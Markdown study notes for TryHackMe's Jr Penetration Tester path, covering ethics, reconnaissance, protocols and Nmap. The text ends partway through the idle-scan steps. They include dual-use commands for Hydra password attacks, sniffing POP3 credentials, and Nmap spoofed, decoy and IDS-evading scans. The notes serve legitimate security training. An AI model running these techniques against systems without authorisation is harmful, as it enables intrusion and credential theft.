---
tags: [pentesting, tryhackme, jr-pentester, notes]
status: in-progress
---

# 🎯 Jr Penetration Tester Path — Notes

> [!info] How to use this file
> Full notes, reorganized by TryHackMe room, in study order. Nothing substantive from your original notes was cut — this pass is about structure (headers, tables, code blocks) and readability, not compression. Each room ends with a **Quick Recap** callout for fast review before quizzes/the PT1 exam.

## 📚 Table of Contents
- [[#1. Introduction to Pentesting]]
- [[#2. Vulnerability Research]]
- [[#3. Network Reconnaissance]]
- [[#4. Protocols and Servers]]
- [[#5. Nmap]]
- [[#6. Web Application Security Fundamentals]]
- [[#7. Burp Suite]]
- [[#8. Web Application Vulnerabilities I]]
- [[#9. Web Application Vulnerabilities II]]
- [[#10. Vulnerability Knowledge]]
- [[#11. OWASP Top 10 2025]]
- [[#CTF Practice Rooms]]

---

## 1. Introduction to Pentesting

### Penetration Testing Ethics

Hackers are sorted into three hats, based on the ethics and motivations behind their actions:

- **White Hat** — considered the "good people." They remain within the law and use their skills to benefit others.
- **Grey Hat** — use their skills to benefit others often, but don't always respect or follow the law or ethical standards.
- **Black Hat** — criminals who seek to damage organisations or gain financial benefit at the cost of others.

### Rules of Engagement (ROE)

The ROE is a document created at the initial stages of a penetration testing engagement. It consists of three main sections, which decide how the engagement is carried out:

- **Permission** — gives explicit permission for the engagement to be carried out. Essential to legally protect individuals and organisations for the activities they carry out.
- **Test Scope** — annotates the specific targets the engagement should apply to. For example, the test may only apply to certain servers or applications, not the entire network.
- **Rules** — defines exactly which techniques are permitted during the engagement. For example, phishing might be explicitly prohibited while MITM attacks are okay.

### Penetration Testing Methodologies

The steps a pentester takes during an engagement is the **methodology**. A practical methodology is a smart one — the steps taken are relevant to the situation at hand. All industry methodologies share this general theme:

1. **Information Gathering** — collecting as much publicly accessible information about a target/organisation as possible (OSINT, research). This does **not** involve scanning any systems.
2. **Enumeration/Scanning** — discovering applications and services running on the systems, e.g. finding a web server that may be potentially vulnerable.
3. **Exploitation** — leveraging discovered vulnerabilities on a system or application, using public exploits or exploiting application logic.
4. **Privilege Escalation** — once you have a foothold, this is the attempt to expand access. You can escalate **horizontally** (another account of the same permission group, i.e. another user) or **vertically** (a higher permission group, i.e. an administrator).
5. **Post-exploitation** — has a few sub-stages:
   1. What other hosts can be targeted (pivoting)
   2. What additional information can be gathered now that you're a privileged user
   3. Covering your tracks
   4. Reporting

#### Named Methodologies

**OSSTMM** (Open Source Security Testing Methodology Manual) — a detailed framework of testing strategies for systems, software, applications, communications, and the human aspect of cybersecurity. Focuses primarily on how systems/applications communicate, covering:
1. Telecommunications (phones, VoIP, etc.)
2. Wired Networks
3. Wireless communications

**OWASP** (Open Web Application Security Project) — a community-driven, frequently updated framework used solely to test the security of web applications and services.

**NIST Cybersecurity Framework 1.1** — a popular framework used to improve an organisation's cybersecurity standards and manage cyber-threat risk. An honourable mention due to its popularity and detail.

**NCSC CAF** (Cyber Assessment Framework) — an extensive framework of fourteen principles used to assess the risk of various cyber threats and an organisation's defences against them. Applies to organisations performing "vitally important services and activities" (critical infrastructure, banking, etc.). Focuses on and assesses:
- Data security
- System security
- Identity and access control
- Resiliency
- Monitoring
- Response and recovery planning

### Black Box, White Box, Grey Box Testing

- **Black-Box Testing** — a high-level process where the tester isn't given any information about the inner workings of the application or service.
- **Grey-Box Testing** — the most popular for things like penetration testing. A combination of black-box and white-box; the tester has **limited** knowledge of the internal components.
- **White-Box Testing** — a low-level process, usually done by a software developer who knows programming and application logic, testing the internal components directly.

### The CIA Triad

An information security model used throughout the creation of a security policy. Consisting of **C**onfidentiality, **I**ntegrity, and **A**vailability, this model is an industry standard, and should help determine the value of data and, in turn, the attention it needs from the business.

- **Confidentiality** — the protection of data from unauthorized access and misuse. Organisations always have some form of sensitive data stored on their systems; confidentiality protects that data from parties it's not intended for.
- **Integrity** — the condition where information is kept accurate and consistent unless authorized changes are made. Information can change because of careless access/use, errors in the information system, or unauthorized access/use.
- **Availability** — for data to be useful, it must be available and accessible by the user.

### Principles of Privileges

The levels of access given to individuals are determined by two primary factors:
- The individual's role/function within the organisation
- The sensitivity of the information being stored on the system

Two key concepts are used to assign and manage access rights:
- **PIM** (Privileged Identity Management) — translates a user's organisational role into an access role on a system.
- **PAM** (Privileged Access Management) — manages the privileges that access role has, amongst other things.

### Security Models Continued

**The Bell-La Padula Model** — used to achieve **confidentiality**. Assumes an organisation's hierarchical structure, where everyone's responsibilities/roles are well-defined. Grants access to pieces of data (objects) on a strict need-to-know basis. Rule: **"no write down, no read up."**

**Biba Model** — arguably the equivalent of Bell-La Padula but for the **integrity** side of the CIA triad. Applies the rule "**no write up, no read down**" to objects (data) and subjects (users): subjects can create or write content to objects at or below their level, but can only read the contents of objects above their level.

### Threat Modelling & Incident Response

The threat modelling process is very similar to a workplace risk assessment for employees and customers. The principles return to:
- Preparation
- Identification
- Mitigations
- Review

It's a complex process needing constant review and discussion with a dedicated team. An effective threat model includes:
- Threat intelligence
- Asset identification
- Mitigation capabilities
- Risk assessment

**STRIDE** and **PASTA** are two useful frameworks:

**STRIDE**:
- **S**poofing — requires authenticating requests and users accessing a system. Spoofing = a malicious party falsely identifying itself as another.
- **T**ampering — anti-tampering measures give a system/application integrity. Accessed data must be kept integral and accurate.
- **R**epudiation — dictates the use of services like activity logging for a system/application to track.
- **I**nformation Disclosure — applications/services handling multiple users' information need to be configured to only show information relevant to the owner.
- **D**enial of Service — applications/services use system resources; measures should prevent abuse from bringing the whole system down.
- **E**levation of Privilege — the worst-case scenario: a user escalates their authorization to a higher level, e.g. administrator.

**PASTA** — Process for Attack Simulation and Threat Analysis.

A breach of security is known as an **incident**. Despite rigorous threat models and secure system designs, incidents do happen. Actions taken to resolve and remediate the threat are **Incident Response (IR)** — a whole career path in cybersecurity.

**CSIRT** (Computer Security Incident Response Team) stages:
- **Preparation** — do we have the resources and plans in place to deal with the incident?
- **Identification** — has the threat and threat actor been correctly identified so we can respond?
- **Containment** — can the threat/incident be contained to prevent other systems/users from being impacted?
- **Eradication** — remove the active threat.
- **Recovery** — a full review of impacted systems to return to business-as-usual.
- **Lessons Learned** — what can be learnt from the incident? (e.g. if due to a phishing email, employees should be trained better to detect phishing).

> [!summary] Quick Recap — Intro to Pentesting
> - ROE = Permission + Scope + Rules, always signed before testing
> - Methodology backbone: Recon → Enumeration → Exploitation → Priv Esc → Post-Ex
> - CIA triad = what you protect; STRIDE = what attacks it
> - Bell-La Padula = confidentiality ("no read up"); Biba = integrity ("no write up")
> - CSIRT = Prep → Identify → Contain → Eradicate → Recover → Lessons Learned

---

## 2. Vulnerability Research

### Introduction to Vulnerabilities

A vulnerability in cybersecurity is a weakness or flaw in the design, implementation, or behaviours of a system or application. An attacker can exploit these weaknesses to gain access to unauthorised information or perform unauthorised actions.

NIST defines a vulnerability as a "weakness in an information system, system security procedures, internal controls, or implementation that could be exploited or triggered by a threat source."

**Types of vulnerabilities:**
- **Operating System** — found within OSs, often result in privilege escalation.
- **(Mis)Configuration-based** — stem from an incorrectly configured application or service, e.g. a website exposing customer details.
- **Weak or Default Credentials** — applications/services with authentication ship with default credentials on install.
- **Application Logic** — result of poorly designed applications.
- **Human-Factor** — leverage human behaviour.
- **Version Disclosure** — finding out the version of an application, then using [Exploit-DB](https://www.exploit-db.com/) to search for exploits matching that version.
- **Remote Code Execution** — being able to execute commands on the target running the vulnerable application/service, letting you read files or run commands you otherwise couldn't via the application alone.

### Scoring Vulnerabilities (CVSS & VPR)

Vulnerability management is the process of evaluating, categorising, and ultimately remediating threats (vulnerabilities) faced by an organisation. Vulnerability scoring plays a vital role, determining the potential risk and impact a vulnerability may have on a network or computer system.

**Common Vulnerability Scoring System (CVSS)** — awards points to a vulnerability based on its features, availability, and reproducibility. The score is determined by factors including:
1. How easy is it to exploit the vulnerability?
2. Do exploits exist for it?
3. How does it interfere with the CIA triad?

**Vulnerability Priority Rating (VPR)** — a much more modern framework developed by Tenable. It's risk-driven — vulnerabilities are scored with heavy focus on the actual risk posed to the organisation, rather than factors like impact alone (as with CVSS).

### Vulnerability Databases

1. [NVD (National Vulnerability Database)](https://nvd.nist.gov/vuln)
2. [Exploit-DB](http://exploit-db.com)

**Key terms:**
- **Vulnerability** — a weakness or flaw in the design, implementation, or behaviours of a system or application.
- **Exploit** — an action or behaviour that utilises a vulnerability on a system or application.
- **Proof of Concept (PoC)** — a technique or tool that demonstrates the exploitation of a vulnerability.

**NVD – National Vulnerability Database** — lists all publicly categorised vulnerabilities. In cybersecurity, vulnerabilities are classified as "**C**ommon **V**ulnerabilities and **E**xposures" (CVE). CVEs use the format `CVE-YEAR-IDNUMBER`. For example, the vulnerability WannaCry used was `CVE-2017-0144`.

**Exploit-DB** — retains exploits for software and applications, stored by name, author, and version of the software/application.

### Automated vs Manual Vulnerability Research

There's a myriad of tools and services available for vulnerability scanning, ranging from commercial (heavy bill) to open-source/free. Vulnerability scanners are a convenient way of quickly canvassing an application for flaws.

For example, [Nessus](https://www.tenable.com/products/nessus) has both a free (community) and commercial edition — the commercial version costs thousands of pounds/year and is used by organisations providing pentesting services or audits. Frameworks like Metasploit often have vulnerability scanners built into some modules.

Both automated and manual techniques test an application/program for vulnerabilities including:
- **Security Misconfigurations** — vulnerabilities due to developer oversight.
- **Broken Access Control** — an attacker accessing parts of the application they're not supposed to.
- **Insecure Deserialization** — insecure processing of data sent across an application; an attacker may pass malicious code that gets executed.
- **Injection** — an attacker inputs malicious data into an application.

### Finding Manual Exploits

- **Rapid7** — much like Exploit-DB and NVD, a vulnerability research database. The difference: it also acts as an exploit database, and you can filter by type of vulnerability.
- **GitHub** — a popular service for developers to host/share source code. Security researchers use it too, for the same collaborative reasons.
- **Searchsploit** — available on pentesting distros like Kali. An offline copy of Exploit-DB, containing copies of exploits on your system.

> [!summary] Quick Recap — Vulnerability Research
> - CVE format: `CVE-YEAR-ID`
> - CVSS = exploitability + impact; VPR = organizational risk (Tenable)
> - `searchsploit` = offline first stop on Kali; Exploit-DB / Rapid7 / GitHub online
> - Vuln = the flaw; Exploit = code using the flaw; PoC = demo of exploitation

---

## 3. Network Reconnaissance

### Passive Reconnaissance

Reconnaissance (recon) is a preliminary survey to gather information about a target — the first step in [The Unified Kill Chain](https://www.unifiedkillchain.com/) to gain an initial foothold. Divided into:
1. **Passive Reconnaissance**
2. **Active Reconnaissance**

**Passive reconnaissance** activities include:
- Looking up DNS records of a domain from a public DNS server.
- Checking job ads related to the target website.
- Reading news articles about the target company.

**Active reconnaissance**, by contrast, requires direct engagement with the target:
- Connecting to a company server such as HTTP, FTP, SMTP.
- Calling the company to try to get information (social engineering).
- Entering company premises pretending to be a repairman.

Essential passive-recon tools: `whois`, `nslookup`, `dig`

**Whois** — a request/response protocol following [RFC 3912](https://www.ietf.org/rfc/rfc3912.txt). A WHOIS server listens on TCP port 43. The domain registrar maintains the WHOIS records for the domain names it leases. Of particular interest:
- Registrar — via which registrar the domain was registered
- Contact info of registrant — name, organization, address, phone (unless hidden via a privacy service)
- Creation, update, and expiration dates
- Name Server — which server to ask to resolve the domain name

**nslookup and dig** — `nslookup DOMAIN_NAME` finds the IP address of a domain (Name Server Look Up), or more generally `nslookup OPTIONS DOMAIN_NAME SERVER`:
- **OPTIONS** — query type (e.g. `A` for IPv4, `AAAA` for IPv6)
- **DOMAIN_NAME** — the domain you're looking up
- **SERVER** — the DNS server to query. Cloudflare: `1.1.1.1` / `1.0.0.1`. Google: `8.8.8.8` / `8.8.4.4`. Quad9: `9.9.9.9` / `149.112.112.112`

**Query types:**
| Type | Meaning |
|---|---|
| A | IPv4 Addresses |
| AAAA | IPv6 Addresses |
| CNAME | Canonical Name |
| MX | Mail Servers |
| SOA | Start of Authority |
| TXT | TXT Records |

`dig` (Domain Information Groper) gives more advanced DNS queries: `dig DOMAIN_NAME` or `dig DOMAIN_NAME TYPE` to specify record type, optionally `dig @SERVER DOMAIN_NAME TYPE` to pick the server.

**DNSDumpster** — `nslookup`/`dig` can't find subdomains on their own. A domain might include subdomains (e.g. `wiki.tryhackme.com`, `webmail.tryhackme.com`) that hold a trove of information about the target.

**Shodan.io** — during the passive recon phase, can help learn about a client's network without actively connecting to it. Defensively, it's also useful to learn about connected/exposed devices belonging to your own organization.

### Active Reconnaissance

Active reconnaissance requires making some kind of contact with the target — a phone call, a visit under pretence (social engineering), or a direct connection (visiting the website, checking if a firewall has an SSH port open).

**Web Browser** — convenient since it's readily available everywhere. On the transport level, connects to:
- TCP port 80 by default over HTTP
- TCP port 443 by default over HTTPS

**Ping** — checks whether you can reach a remote system and it can reach you back (originally for connectivity checks; here, mainly for checking if a system is online). Sends an ICMP Echo packet; if the remote system is online and the packet isn't blocked by a firewall, it sends back an ICMP Echo Reply.

**Traceroute** — traces the route taken by packets from your system to another host, finding the IP addresses of the routers/hops traversed, and revealing the number of hops between systems. There's no direct way to discover this path, so `traceroute` relies on ICMP to "trick" routers into revealing their IP by using a small Time To Live (TTL) in the IP header. TTL isn't a time unit — it's the max number of hops a packet can pass through before being dropped.

On Linux, `traceroute` sends UDP datagrams with TTL=1 first, causing the first router to hit TTL=0 and send back an ICMP Time-to-Live-exceeded — revealing that router's IP. Then TTL=2, dropped at the second router, and so on.

**Telnet** — developed in 1969 to communicate with a remote system via CLI. `telnet` uses the TELNET protocol for remote administration, default port 23. From a security perspective, telnet sends all data — including usernames and passwords — in cleartext, making it easy for anyone with access to the channel to steal credentials. The secure alternative is SSH. Despite this, telnet's simplicity makes it useful for other purposes: since it relies on TCP, you can use it to connect to any TCP service and grab its banner: `telnet 10.112.139.18 PORT`.

**Netcat (`nc`)** — has many uses for a pentester. Supports both TCP and UDP; can act as a client connecting to a listening port, or a server listening on a port of your choice.
- Connect and grab a banner (like telnet): `nc 10.112.139.18 PORT` (you might need SHIFT+ENTER after a GET line)
- Listen on a port: `nc -lp 1234`, or better `nc -vnlp 1234` (equivalent to `nc -v -l -n -p 1234`). Order of letters doesn't matter as long as the port number directly follows `-p`.
  - `-l` — Listen mode
  - `-p` — Specify the port number
  - `-n` — Numeric only; no DNS hostname resolution
  - `-v` — Verbose output
  - `-vv` — Very verbose
  - `-k` — Keep listening after client disconnects
- Client side: `nc 10.112.139.18 PORT_NUMBER`. Once connected, whatever you type on the client is echoed on the server and vice versa.

> [!summary] Quick Recap — Reconnaissance
> - Passive = no contact (whois, dig, DNSDumpster, Shodan). Active = contact (browser, ping, traceroute, telnet, nc)
> - WHOIS = TCP/43; telnet default port 23
> - `nc -vnlp PORT` to listen; `nc IP PORT` to connect/grab a banner
> - `traceroute` works by incrementing TTL and reading ICMP "TTL exceeded" replies

---

## 4. Protocols and Servers

### Protocols and Servers (Part 1)

**Telnet** — an application layer protocol used to connect to a virtual terminal of another computer. Using Telnet, a user can log into another computer and access its terminal (console) to run programs, start batch processes, and perform system administration tasks remotely. Relatively simple: when a user connects, they're asked for a username and password; upon correct authentication, they access the remote system's terminal. A Telnet server listens on port 23 by default. It gives access to the remote terminal quickly, but it's not reliable for remote administration since all data is sent in cleartext.
`telnet MACHINE_IP Port_Number`

**Hypertext Transfer Protocol (HTTP)** — the protocol used to transfer web pages. Your browser connects to the webserver and uses HTTP to request HTML pages, images, and other files, and to submit forms/upload files. HTTP sends and receives data as cleartext (not encrypted). You can use `telnet` instead of a browser to request a file from a webserver:
1. Connect to port 80: `telnet 10.113.188.69 80`
2. Type `GET /index.html HTTP/1.1` to retrieve `index.html`, or `GET / HTTP/1.1` for the default page.
3. Provide a value for the host, e.g. `host: telnet`, and press Enter/Return **twice**.

Three popular HTTP server choices:
- [Apache](https://www.apache.org/)
- [Internet Information Services (IIS)](https://www.iis.net/)
- [nginx](https://nginx.org/)

Apache and Nginx are free/open-source; IIS is closed-source and requires a paid license.

**File Transfer Protocol (FTP)** — developed to make transferring files between different systems efficient. FTP also sends/receives data as cleartext, so you can use Telnet (or Netcat) to communicate with an FTP server as a client. `STAT` provides extra info. `SYST` shows the target's System Type (e.g. UNIX). `PASV` switches to passive mode. Two FTP modes:
- **Active** — data sent over a separate channel originating from the FTP server's port 20.
- **Passive** — data sent over a separate channel originating from an FTP client's port above 1023.

`TYPE A` switches file transfer mode to ASCII; `TYPE I` switches to binary. You can't transfer a file using a simple client like Telnet, because FTP creates a separate connection for file transfer — you need an actual FTP client. After logging in, you get the `ftp>` prompt: `ls` to list files, `ascii` to switch mode for a text file, `get FILENAME` to establish another channel and transfer the file.

FTP server software options: vsftpd, ProFTPD, uFTP

**Simple Mail Transfer Protocol (SMTP)** — email delivery over the Internet requires:
1. Mail Submission Agent (MSA)
2. Mail Transfer Agent (MTA)
3. Mail Delivery Agent (MDA)
4. Mail User Agent (MUA)

Relevant email protocols:
- Simple Mail Transfer Protocol (SMTP) — communicates with an MTA server
- Post Office Protocol v3 (POP3) or Internet Message Access Protocol (IMAP) — communicate with an MDA server

SMTP uses cleartext (no encryption on commands), so a basic Telnet client can connect and act as an email client (MUA) sending a message. SMTP server listens on port 25 by default. After `helo`, issue `mail from:`, `rcpt to:` to indicate sender/recipient. To send the message, issue `data`, type the message, then `<CR><LF>.<CR><LF>` (Enter, `.`, Enter). The SMTP server queues the message.

**Post Office Protocol 3 (POP3)** — downloads email messages from an MDA server. The user connects to the POP3 server on the default port 110, then authenticates: `USER frank`, `PASS D2xc9CgD`. `STAT` replies `+OK 1 179` — per RFC 1939, a positive `STAT` response is `+OK nn mm`, where *nn* is the number of messages and *mm* is the inbox size in octets/bytes. `LIST` gives a list of new messages; `RETR 1` retrieves the first message. Your mail client (MUA) does this same handshake behind a sleek GUI.

**Internet Message Access Protocol (IMAP)** — more sophisticated than POP3; keeps your email synchronized across multiple devices/clients (mark a message read on your phone, the change replicates to your laptop on next sync). Connect via Telnet to port 143, authenticate with `LOGIN username password`. IMAP requires each command to be preceded by a random tracking string (`c1`, `c2`, etc.). List mail folders: `LIST "" "*"`. Check for new inbox messages: `EXAMINE INBOX`.

### Protocols and Servers 2 — Attacks

From a security perspective, always think about what you aim to protect — the CIA triad. **Confidentiality** = keeping communications accessible only to intended parties. **Integrity** = assuring data sent is accurate, consistent, and complete on arrival. **Availability** = being able to access the service when needed.

Knowing we protect Confidentiality, Integrity, and Availability (CIA), an attack aims to cause **D**isclosure, **A**lteration, and **D**estruction (**DAD**). Network packet capture violates confidentiality (disclosure). A successful password attack can also lead to disclosure. A MITM attack breaks integrity, since it can alter communicated data.

**Sniffing Attack** — using a network packet capture tool to collect information about the target. When a protocol communicates in cleartext, the exchanged data can be captured by a third party. Conducted using an Ethernet (802.3) network card with proper permissions (root on Linux, administrator on Windows). Tools:
1. **Tcpdump** — free, open-source CLI, ported to many OSs.
2. **Wireshark** — free, open-source GUI, available for Linux, macOS, Windows.
3. **Tshark** — a CLI alternative to Wireshark.

Example: capturing a username/password with Tcpdump — `sudo tcpdump port 110 -A`. Requires access to network traffic (a wiretap or a switch with port mirroring). `sudo` is needed since packet captures require root privileges. `port 110` filters to just POP3 traffic. `-A` displays captured packet contents in ASCII. The same can be done in Wireshark by entering `pop` in the filter field.

**Man-in-the-Middle (MITM) Attack** — occurs when a victim (A) believes they're communicating with a legitimate destination (B) but is unknowingly communicating with an attacker (E). Any time you browse over HTTP, you're susceptible, and you can't recognize it happening. Tools: Ettercap, Bettercap. MITM can also affect other cleartext protocols like FTP, SMTP, POP3. Mitigation requires cryptography — proper authentication plus encryption/signing of exchanged messages. With Public Key Infrastructure (PKI) and trusted root certificates, TLS protects from MITM attacks.

**Transport Layer Security (TLS)** — SSL (Secure Sockets Layer) started as the web began seeing new applications like online shopping and payment info. TLS is more secure than SSL and has practically replaced it (they're often used interchangeably). An existing cleartext protocol can be upgraded to use encryption via SSL/TLS: HTTP, FTP, SMTP, POP3, IMAP, etc.

| Cleartext | Encrypted |
|---|---|
| HTTP : Port 80 | HTTPS : Port 443 |
| FTP : Port 21 | FTPS : Port 990 |
| SMTP : Port 25 | SMTPS : Port 465 |
| POP3 : Port 110 | POP3S : Port 995 |
| IMAP : Port 143 | IMAPS : Port 993 |

To retrieve a web page over plain HTTP, the browser performs at least two steps:
1. Establish a TCP connection with the remote web server
2. Send HTTP requests, such as `GET` and `POST`

HTTPS requires an additional step to encrypt traffic, taking place after the TCP connection and before HTTP requests — inferable from the ISO/OSI model:
1. Establish a TCP connection
2. **Establish SSL/TLS connection**
3. Send HTTP requests to the webserver

To establish an SSL/TLS connection, the client performs the proper handshake with the server, based on RFC 6101.

**Secure Shell (SSH)** — created to provide a secure way for remote system administration. Requires an SSH server and client. The SSH server listens on port 22 by default. The client can authenticate using:
- A username and password
- A private/public keypair (after the server is configured to recognize the corresponding public key)

Connect: `ssh username@MACHINE_IP`. Transfer files with SCP (Secure Copy Protocol, based on SSH): `scp mark@MACHINE_IP:/home/mark/archive.tar.gz ~` — copies `archive.tar.gz` from the remote `/home/mark` directory to `~` locally.

**Password Attack** — many protocols require authentication, i.e. proving who you claim to be. With protocols like POP3, you shouldn't get mailbox access before verifying identity. Authentication can be achieved through one, or a combination, of:
1. Something you *know* — password, PIN code
2. Something you *have* — SIM card, RFID card, USB dongle
3. Something you *are* — fingerprint, iris

Attacks against passwords are usually carried out by:
1. **Password Guessing** — requires some knowledge of the target (pet's name, birth year).
2. **Dictionary Attack** — expands on guessing, tries all valid words in a dictionary/wordlist.
3. **Brute Force Attack** — the most exhaustive and time-consuming; tries all possible character combinations (grows exponentially with character count).

An automated way to try common passwords or wordlist entries: THC Hydra. Supports many protocols: FTP, POP3, IMAP, SMTP, SSH, and all HTTP methods. General syntax:

```
hydra -l username -P wordlist.txt server service
```

- `-l username` — precedes the login name of the target
- `-P wordlist.txt` — precedes the password wordlist file
- `server` — hostname or IP address of the target
- `service` — the protocol/service to launch the dictionary attack against

Extra optional arguments:
- `-s PORT` — specify a non-default port for the service
- `-V` or `-vV` — verbose, shows the username/password combos being tried (great to watch progress or confirm syntax)
- `-t n` — number of parallel connections/threads, e.g. `-t 16`
- `-d` — debugging, more detail on what's happening (e.g. reveals immediately if Hydra is trying to connect to a closed port and timing out)

> [!summary] Quick Recap — Protocols and Servers
> - Know the default ports cold: FTP 21, SSH 22, Telnet 23, SMTP 25, HTTP 80, POP3 110, IMAP 143, HTTPS 443, FTPS 990, IMAPS 993, POP3S 995
> - Cleartext protocol → sniff with tcpdump/Wireshark/tshark; weak auth → brute-force with Hydra
> - CIA (what you protect) vs DAD — Disclosure/Alteration/Destruction (what attacks aim for)
> - TLS upgrade path adds one extra handshake step before the app-layer request
> - FTP needs a real FTP client for file transfer — telnet/netcat can only banner-grab/issue commands

---

## 5. Nmap

### Nmap Live Host Discovery

Before scanning ports, you need to know which hosts are actually alive. Nmap's live host discovery generally follows:
1. ARP scan (if on the same subnet)
2. Discover live hosts
3. Reverse-DNS lookup

The next step is checking which ports are open/listening and which are closed — covered in the port scan rooms:
4. TCP connect port scan
5. TCP SYN port scan
6. UDP port scan

**TCP and UDP Ports** — a TCP or UDP port identifies a network service running on a host. A server provides the network service and adheres to a specific network protocol (providing time, responding to DNS queries, serving web pages). A port is usually linked to a service by its port number — e.g. an HTTP server binds to TCP port 80 by default, or TCP 443 if it supports SSL/TLS.

At a simplified level, ports are either:
- **Open** — a service is listening
- **Closed** — no service is listening

Nmap actually considers **six states**:
1. **Open** — a service is listening on the port.
2. **Closed** — no service is listening, but the port is accessible (reachable, not blocked).
3. **Filtered** — Nmap can't determine open/closed because the port isn't accessible, usually due to a firewall blocking Nmap's packets or the responses.
4. **Unfiltered** — Nmap can't determine open/closed, although the port is accessible. Seen with an ACK scan (`-sA`).
5. **Open|Filtered** — Nmap can't tell whether the port is open or filtered.
6. **Closed|Filtered** — Nmap can't tell whether the port is closed or filtered.

**TCP Flags** — Nmap supports different types of TCP port scans; understanding them requires reviewing the TCP header (the first 24 bytes of a TCP segment). Source and destination port numbers each get 16 bits (2 bytes); sequence and acknowledgement numbers each get 32 bits (4 bytes); six rows total = 24 bytes. The flags Nmap can set/unset (setting a flag = setting its bit to 1), from left to right:
- **URG** — Urgent flag; the urgent pointer field is significant, and the segment is processed immediately without waiting on previously sent segments.
- **ACK** — Acknowledgement flag; the acknowledgement number is significant, used to acknowledge receipt of a segment.
- **PSH** — Push flag; asks TCP to pass data to the application promptly.
- **RST** — Reset flag; used to reset the connection (e.g. a firewall tearing down a connection, or a host with no service on the receiving end responding to data sent to it).
- **SYN** — Synchronize flag; initiates the TCP 3-way handshake and synchronizes sequence numbers. The sequence number is set randomly during connection establishment.
- **FIN** — the sender has no more data to send.

### Nmap Basic Port Scans

**TCP Connect Scan** — completes the full TCP 3-way handshake. Client sends SYN, server responds SYN/ACK if open, client completes with ACK. Selected with `-sT`. If you're not a privileged user (root/sudoer), this is the only option for discovering open TCP ports. `-F` enables fast mode, scanning the 100 most common ports instead of 1000. `-r` scans ports in consecutive order instead of random — useful for testing whether ports open consistently, e.g. as a target boots up.

**TCP SYN Scan** — the default scan mode, requires a privileged user. Doesn't complete the 3-way handshake; tears down the connection once it gets a response from the server. Because no full TCP connection is established, it decreases the chance of the scan being logged. Selected with `-sS`. It's very reliable — discovers the same open ports as a connect scan, without ever fully connecting.

**UDP Scan** — UDP is connectionless, so no handshake is needed. There's no guarantee a service listening on a UDP port responds to your packets, but if a UDP packet hits a closed port, an ICMP port-unreachable error (type 3, code 3) comes back. Selected with `-sU`; can be combined with a TCP scan.

**Fine-Tuning Scope and Performance:**
- Port list: `-p22,80,443` — scans ports 22, 80, 443
- Port range: `-p1-1023` (inclusive), `-p20-25`
- All ports: `-p-` scans all 65535 ports
- Top 100: `-F`
- Top N: `--top-ports 10`
- Timing templates: `-T<0-5>` — `-T0` slowest/paranoid, `-T5` fastest/insane. Six templates: paranoid (0), sneaky (1), polite (2), normal (3), aggressive (4), insane (5). To avoid IDS alerts, consider `-T0`/`-T1` (`-T0` scans one port at a time, waiting 5 minutes between probes — do the maths on how long a full scan would take). Default is `-T3` if unspecified. `-T5` is fastest but can hurt accuracy due to packet loss. `-T4` is often used in CTFs/practice; `-T1` is often used in real engagements where stealth matters more than speed.
- Packet rate: `--min-rate <number>` / `--max-rate <number>` — e.g. `--max-rate 10` caps at 10 packets/sec.
- Probe parallelism: `--min-parallelism <numprobes>` / `--max-parallelism <numprobes>` — controls how many host-discovery/open-port probes run in parallel, e.g. `--min-parallelism=512`.

### Nmap Advanced Port Scans

This room covers: Null Scan, FIN Scan, Xmas Scan, Maimon Scan, ACK Scan, Window Scan, Custom Scan — plus Spoofing IP, Spoofing MAC, Decoy Scan, Fragmented Packets, and Idle/Zombie Scan.

**Null Scan** (`-sN`) — sets no flags at all (all six bits zero). A TCP packet with no flags won't trigger a response from an open port. Expect an RST from a closed port — so lack of RST means the port is open or filtered.

**FIN Scan** (`-sF`) — sends a packet with only the FIN flag set. No response if the port is open, so Nmap can't be sure if it's open or blocked by a firewall. A closed port should respond with RST. Some firewalls will 'silently' drop traffic without sending an RST.

**Xmas Scan** (`-sX`) — named after Christmas tree lights; sets FIN, PSH, and URG simultaneously. Same logic as Null/FIN: RST = closed, otherwise reported open|filtered.

**Maimon Scan** (`-sM`) — sets FIN and ACK. The target should send RST as a response, but certain BSD-derived systems drop the packet on an open port, exposing it. Doesn't work on most modern targets, but included to understand the port-scanning mechanism/hacking mindset.

**TCP ACK Scan** (`-sA`) — sends a packet with only ACK set. The target responds to the ACK with RST regardless of port state, because an ACK-flagged packet should only be sent in response to received data, unlike this. Useful when there's a firewall in front of the target — which ACK packets get responses tells you which ports the firewall isn't blocking, so it's more suited to discovering firewall ruleset/configuration than open/closed state.

**Window Scan** (`-sW`) — almost the same as ACK scan, but examines the TCP Window field of returned RST packets. On specific systems, this can reveal the port is open. Against a Linux system with no firewall, it won't provide much info; against a server behind a firewall, expect more useful results.

**Custom Scan** (`--scanflags`) — experiment with your own TCP flag combination beyond the built-in types, e.g. `--scanflags RSTSYNFIN` to set SYN, RST, and FIN simultaneously.

**Spoofing and Decoys** — you can scan using a spoofed IP or MAC address, but this is only useful if you can guarantee capturing the response (scanning from a random network with a spoofed IP likely gets no routed response back to you).

`nmap -S SPOOFED_IP MACHINE_IP` — crafts all packets with source IP `SPOOFED_IP`; the target responds to that spoofed address. For accurate results, the attacker must monitor network traffic to analyze replies. In brief, three steps:
1. Attacker sends a packet with a spoofed source IP to the target.
2. Target replies to the spoofed IP as the destination.
3. Attacker captures the replies to figure out open ports.

You'll need to specify the network interface with `-e` and disable ping scan with `-Pn`: `nmap -e NET_INTERFACE -Pn -S SPOOFED_IP MACHINE_IP`. Useless if the attacker can't monitor the network for responses.

**Decoy scan**: `nmap -D 10.10.0.1,10.10.0.2,ME MACHINE_IP` — makes the scan of MACHINE_IP appear to come from 10.10.0.1, 10.10.0.2, and then `ME` (your real IP, in the third position). Another example: `nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME MACHINE_IP` — third/fourth source IPs are random, fifth is the attacker's real IP.

**Fragmented Packets:**
- **Firewall** — software/hardware permitting or blocking packets, based on rules (block-all-with-exceptions or allow-all-with-exceptions).
- **IDS** — an intrusion detection system inspects packets for behavioural patterns or content signatures, raising an alert on a match. Beyond IP/transport headers, an IDS inspects data contents in the transport layer for malicious patterns.
- **Fragmented Packets** — Nmap's `-f` fragments packets, dividing IP data into 8 bytes or less. Another `-f` (`-f -f` or `-ff`) splits into 16-byte fragments instead. Change the default with `--mtu` (always a multiple of 8).

**Idle/Zombie Scan** — requires an idle system on the network you can communicate with. Nmap makes each probe appear to come from the idle (zombie) host, then checks whether the zombie received a response to the spoofed probe by examining the IP identification (IP ID) value in the IP header. Run with `nmap -sI ZOMBIE_IP MACHINE_IP`. Three steps:
1. Trigger the idle host to respond, recording its current IP ID.
2. Send a SYN packet to a target port, spoofed to appear as coming from the idle (zombie) host.
